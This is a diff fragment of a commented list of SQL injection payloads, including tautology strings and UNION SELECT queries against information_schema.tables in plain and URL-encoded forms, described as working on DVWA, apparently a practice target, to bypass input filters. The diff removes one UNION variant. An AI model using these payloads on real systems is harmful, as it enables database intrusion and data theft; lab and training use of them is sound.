@@ -35,7 +35,6 @@
 #   1' or '1'='1' -- #
 #   1'%20or%20'1'='1'%20--%20
 #   1%27%20UNION%20SELECT%20table_schema,%20table_name%20FROM%20information_schema.tables--%20
-#   1' UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.tables; --
 #   1' UNION SELECT table_schema, table_name FROM information_schema.tables-- #
 #
 # This payload works on DVWA to bypass input filters and trigger SQL injection.
